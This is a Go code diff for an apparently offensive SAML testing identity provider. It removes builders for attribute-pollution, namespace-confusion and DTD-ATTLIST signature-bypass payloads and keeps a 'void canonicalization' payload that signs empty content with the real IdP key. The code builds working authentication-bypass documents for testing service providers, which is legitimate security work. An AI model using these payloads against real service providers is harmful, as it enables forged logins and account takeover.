@@ -8,8 +8,6 @@ import (
 	"crypto/x509"
 	"encoding/base64"
 	"fmt"
-	"slices"
-	"strings"
 
 	"github.com/beevik/etree"
 )
@@ -17,8 +15,7 @@ import (
 // Parser differential attacks. Each one emits a document that an SP's
 // signature-validating parser and its claim-reading parser read differently, so
 // the SP verifies one element and then trusts the claims of another. Published
-// as "The Fragile Lock" (Zakhar Fedotkin, PortSwigger, 2025) and tracked for
-// ruby-saml as CVE-2025-66568 and CVE-2025-66567, both fixed in 1.18.0.
+// as "The Fragile Lock" (Zakhar Fedotkin, PortSwigger, 2025).
 //
 // The published exploit chain needs a legitimately signed donor document,
 // because the attacker there cannot sign. Plasmid is the IdP, so it skips the
@@ -33,39 +30,10 @@ const (
 	// failure as an empty canonical form, so both the digest and the signature
 	// cover nothing at all. It signs with the real IdP key so that the SP's
 	// configured certificate matches and canonicalization is the only thing
-	// under test.
+	// under test. Tracked as CVE-2025-66568 in ruby-saml and CVE-2025-66475 in
+	// xmlseclibs.
 	ParserDiffVoidC14N = "void_c14n"
-	// ParserDiffAttrPollution carries the signed ID under several qualified
-	// names at once. libxml2 looks attributes up by local name and ignores the
-	// prefix, REXML does not, so the two resolve the same @ID query to
-	// different elements.
-	ParserDiffAttrPollution = "attr_pollution"
-	// ParserDiffNSConfusion hides a signature behind xml:xmlns, which libxml2
-	// treats as an ordinary attribute and REXML treats as a namespace
-	// redefinition. The two parsers then disagree about which elements are
-	// ds:Signature at all.
-	ParserDiffNSConfusion = "ns_confusion"
-	// ParserDiffDTDAttlist supplies the Response ID through an ATTLIST default
-	// instead of a literal attribute, so only a parser that applies DTD
-	// attribute defaults sees it. It prepends a DOCTYPE, which the XXE mode
-	// also does, and a document may carry only one.
-	ParserDiffDTDAttlist = "dtd_attlist"
 )
-
-// void_c14n is the only offered mode. Against ruby-saml 1.12.4 with nokogiri
-// 1.18.10 / libxml2 2.13.9, the other three payloads are rejected before the
-// parser differential is reached:
-//
-//   - attr_pollution and ns_confusion add attributes or children to the element
-//     the response signature covers, so the digest stops matching. The published
-//     attack borrows a signature over a different document; signing honestly and
-//     then rewriting the signed element cannot work. They need a shape where the
-//     polluted element is not the signed one.
-//   - dtd_attlist is invisible to the target: ruby-saml parses with STRICT|NONET
-//     and never applies DTD attribute defaults, so neither parser sees the ID.
-//
-// Their builders stay out of the offered set until a real implementation
-// accepts them, and are reachable through applyWith for that work.
 
 // emptyStringDigestB64 is the base64 SHA-256 of zero bytes. A vulnerable
 // implementation that canonicalized nothing computes exactly this, so it is
@@ -76,10 +44,9 @@ var emptyStringDigestB64 = func() string {
 }()
 
 type parserDiffSpec struct {
-	mode        string
-	label       string
-	help        string
-	usesDoctype bool
+	mode  string
+	label string
+	help  string
 	// validated records that this payload has been shown to bypass a real
 	// vulnerable implementation and to be rejected by a patched one. Only
 	// validated modes are offered. A payload that merely looks right is worse
@@ -99,25 +66,6 @@ var parserDiffSpecs = []parserDiffSpec{
 		help:      "Signs the empty string with the real IdP key and declares a relative namespace URI so canonicalization fails document-wide. An SP that treats the failure as an empty canonical form accepts any claims you override.",
 		validated: true,
 		build:     buildVoidC14N,
-	},
-	{
-		mode:  ParserDiffAttrPollution,
-		label: "attribute pollution (duplicate namespaced ID attributes)",
-		help:  "Carries the signed ID as both a prefixed and an unprefixed attribute. An SP whose signature check resolves @ID namespace-agnostically and whose claim reader does not will validate one element and trust another.",
-		build: buildAttrPollution,
-	},
-	{
-		mode:  ParserDiffNSConfusion,
-		label: "namespace confusion (xml:xmlns redefinition)",
-		help:  "Wraps a decoy signature in elements that redefine the XML-Signature namespace through xml:xmlns, which is an ordinary attribute to libxml2 and a namespace declaration to REXML.",
-		build: buildNSConfusion,
-	},
-	{
-		mode:        ParserDiffDTDAttlist,
-		label:       "DTD-defaulted ID via <!ATTLIST> (needs DTD processing)",
-		help:        "Removes the Response ID attribute and supplies it as a DTD default instead, so only a parser that applies ATTLIST defaults can see it. Prepends a DOCTYPE, so the XXE mode is skipped when this one is active.",
-		usesDoctype: true,
-		build:       buildDTDAttlist,
 	},
 }
 
@@ -160,14 +108,6 @@ func IsParserDiffMode(mode string) bool {
 	return ok
 }
 
-// ParserDiffUsesDoctype reports whether a mode prepends a DOCTYPE. The XXE mode
-// prepends one too and a document may only have one, so the transform has to
-// drop one of them rather than emit both.
-func ParserDiffUsesDoctype(mode string) bool {
-	spec, ok := lookupParserDiffSpec(mode)
-	return ok && spec.usesDoctype
-}
-
 func lookupParserDiffSpec(mode string) (parserDiffSpec, bool) {
 	for _, spec := range parserDiffSpecs {
 		if spec.mode == mode {
@@ -182,25 +122,10 @@ func lookupParserDiffSpec(mode string) (parserDiffSpec, bool) {
 // the builders, because they are the knobs that get turned while testing a
 // payload against a real implementation.
 type parserDiffOptions struct {
-	// void_c14n
 	RelativeNSPrefix  string
 	RelativeNSValue   string
 	DeclareOnResponse bool
 	DeclareOnSigned   bool
-
-	// attr_pollution
-	EmitPrefixedID  bool
-	EmitXMLID       bool
-	PrefixedIDFirst bool
-
-	// ns_confusion
-	DecoyOuterNS string
-	DecoyInnerNS string
-	ConcealTag   string
-	RevealTag    string
-
-	// dtd_attlist
-	DoctypeAttr string
 }
 
 var defaultParserDiffOptions = parserDiffOptions{
@@ -208,21 +133,10 @@ var defaultParserDiffOptions = parserDiffOptions{
 	RelativeNSValue:   "1",
 	DeclareOnResponse: true,
 	DeclareOnSigned:   true,
-
-	EmitPrefixedID:  true,
-	EmitXMLID:       true,
-	PrefixedIDFirst: true,
-
-	DecoyOuterNS: dsNS,
-	DecoyInnerNS: "http://www.w3.org/2000/09/xmldsig_#",
-	ConcealTag:   "Conceal",
-	RevealTag:    "Reveal",
-
-	DoctypeAttr: "ID",
 }
 
-// ParserDiffer emits the parser-differential payloads. Unlike Resigner it holds
-// the real IdP key rather than generating attacker material: void
+// ParserDiffer emits the parser-differential payloads. Unlike Resigner it signs
+// with the real IdP key rather than generated attacker material: void
 // canonicalization only isolates the canonicalization bug if the certificate
 // the SP was configured with is the one that signed. It caches nothing and
 // keeps no mutable state, so it needs no lock.
@@ -369,7 +283,9 @@ func signEmptyString(key *rsa.PrivateKey) (string, error) {
 }
 
 // declareNS adds a namespace declaration, replacing any existing one for the
-// same prefix.
+// same prefix. The prefix matters: libxml2 warns about a relative URI on a
+// default xmlns, and an SP that rejects documents carrying parse warnings never
+// reaches the attack.
 func declareNS(el *etree.Element, prefix, value string) {
 	el.CreateAttr("xmlns:"+prefix, value)
 }
@@ -386,174 +302,4 @@ func signatureTargets(response *etree.Element) []*etree.Element {
 		targets = append(targets, assertion)
 	}
 	return targets
-}
-
-// signedElementID reads the ID the signature actually covers, from the
-// Reference URI rather than from the element's own ID attribute. The pollution
-// and DTD modes have to name that element, and reading it back from the
-// signature keeps working after the resigner has rebuilt one.
-func signedElementID(el *etree.Element) (string, error) {
-	sig := findSignature(el)
-	if sig == nil {
-		return "", fmt.Errorf("%s carries no signature", el.Tag)
-	}
-	signedInfo := findElement(sig, "ds", "SignedInfo")
-	if signedInfo == nil {
-		return "", fmt.Errorf("%s signature has no SignedInfo", el.Tag)
-	}
-	ref := findElement(signedInfo, "ds", "Reference")
-	if ref == nil {
-		return "", fmt.Errorf("%s signature has no Reference", el.Tag)
-	}
-	uri := ref.SelectAttrValue("URI", "")
-	if !strings.HasPrefix(uri, "#") || len(uri) < 2 {
-		return "", fmt.Errorf("%s signature Reference URI %q is not a local ID", el.Tag, uri)
-	}
-	return uri[1:], nil
-}
-
-// attrIndex reports where an attribute sits in the element's attribute list, or
-// -1. Position matters: libxml2 resolves an unqualified @ID lookup to the first
-// attribute whose local name matches, whatever its prefix.
-func attrIndex(el *etree.Element, space, key string) int {
-	return slices.IndexFunc(el.Attr, func(a etree.Attr) bool {
-		return a.Space == space && a.Key == key
-	})
-}
-
-func insertAttrAt(el *etree.Element, index int, space, key, value string) {
-	if index < 0 || index > len(el.Attr) {
-		index = len(el.Attr)
-	}
-	el.Attr = slices.Insert(el.Attr, index, etree.Attr{Space: space, Key: key, Value: value})
-}
-
-func buildAttrPollution(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error) {
-	response := doc.Root()
-	signedID, err := signedElementID(response)
-	if err != nil {
-		return "", fmt.Errorf("attr_pollution: %w", err)
-	}
-
-	// etree keeps only the last of two attributes with the same literal
-	// qualified name when it reads a document back, so the duplicates have to
-	// differ by prefix. That is what the published payload does too.
-	at := attrIndex(response, "", "ID")
-	if at < 0 {
-		return "", fmt.Errorf("attr_pollution: response has no ID attribute")
-	}
-
-	var added []string
-	insertBefore := at
-	if !opt.PrefixedIDFirst {
-		insertBefore = at + 1
-	}
-
-	if opt.EmitXMLID {
-		insertAttrAt(response, insertBefore, "xml", "ID", signedID)
-		added = append(added, "xml:ID")
-		insertBefore++
-	}
-	if opt.EmitPrefixedID && response.Space != "" {
-		insertAttrAt(response, insertBefore, response.Space, "ID", signedID)
-		added = append(added, response.Space+":ID")
-	}
-	if len(added) == 0 {
-		return "", fmt.Errorf("attr_pollution: no duplicate ID variant selected")
-	}
-
-	order := "after ID"
-	if opt.PrefixedIDFirst {
-		order = "before ID"
-	}
-	return fmt.Sprintf("%s %s, all = %q", strings.Join(added, " + "), order, signedID), nil
-}
-
-func buildNSConfusion(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error) {
-	response := doc.Root()
-	sig := findSignature(response)
-	if sig == nil {
-		return "", fmt.Errorf("ns_confusion: response carries no signature to copy")
-	}
-
-	statusDetail, err := statusDetailFor(response)
-	if err != nil {
-		return "", err
-	}
-
-	// Conceal declares the real XML-Signature namespace the ordinary way, so a
-	// namespace-aware parser sees a ds:Signature inside. Reveal redeclares it
-	// through xml:xmlns, which only REXML honours, so the two parsers disagree
-	// about whether the decoy is a signature at all.
-	conceal := statusDetail.CreateElement(opt.ConcealTag)
-	conceal.CreateAttr("xmlns", opt.DecoyOuterNS)
-	reveal := conceal.CreateElement(opt.RevealTag)
-	reveal.CreateAttr("xml:xmlns", opt.DecoyInnerNS)
-
-	decoy := reveal.CreateElement("Signature")
-	for _, child := range sig.ChildElements() {
-		copied := child.Copy()
-		copied.Space = ""
-		decoy.AddChild(copied)
-	}
-
-	return fmt.Sprintf("decoy signature under %s/%s, xml:xmlns=%q", opt.ConcealTag, opt.RevealTag, opt.DecoyInnerNS), nil
-}
-
-// statusDetailFor returns a samlp:StatusDetail to hide a decoy in, creating it
-// if the response has none. StatusDetail and Extensions are the only two
-// elements the schema allows before the Signature, which is what makes them the
-// injection points.
-func statusDetailFor(response *etree.Element) (*etree.Element, error) {
-	status := findElement(response, response.Space, "Status")
-	if status == nil {
-		return nil, fmt.Errorf("ns_confusion: response has no Status element to extend")
-	}
-	prefix := ""
-	if response.Space != "" {
-		prefix = response.Space + ":"
-	}
-	if detail := findElement(status, response.Space, "StatusDetail"); detail != nil {
-		return detail, nil
-	}
-	return status.CreateElement(prefix + "StatusDetail"), nil
-}
-
-func buildDTDAttlist(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error) {
-	response := doc.Root()
-	signedID, err := signedElementID(response)
-	if err != nil {
-		return "", fmt.Errorf("dtd_attlist: %w", err)
-	}
-
-	// The literal attribute has to go: the point is that only a parser applying
-	// DTD defaults can see the ID at all.
-	response.RemoveAttr(opt.DoctypeAttr)
-
-	qname := response.Tag
-	if response.Space != "" {
-		qname = response.Space + ":" + response.Tag
-	}
-	prependDoctype(doc, attlistDoctype(qname, opt.DoctypeAttr, signedID))
-
-	return fmt.Sprintf("%s %s defaulted to %q via ATTLIST", qname, opt.DoctypeAttr, signedID), nil
-}
-
-func attlistDoctype(rootQName, attr, value string) string {
-	return fmt.Sprintf("DOCTYPE %s [\n<!ATTLIST %s %s CDATA #FIXED %q>\n]", rootQName, rootQName, attr, value)
-}
-
-// prependDoctype inserts a DOCTYPE immediately before the root element. etree
-// writes directive data verbatim, so the ATTLIST survives unescaped.
-func prependDoctype(doc *etree.Document, data string) {
-	doc.InsertChildAt(rootIndex(doc), etree.NewDirective(data))
-}
-
-func rootIndex(doc *etree.Document) int {
-	for i, child := range doc.Child {
-		if _, ok := child.(*etree.Element); ok {
-			return i
-		}
-	}
-	return len(doc.Child)
 }
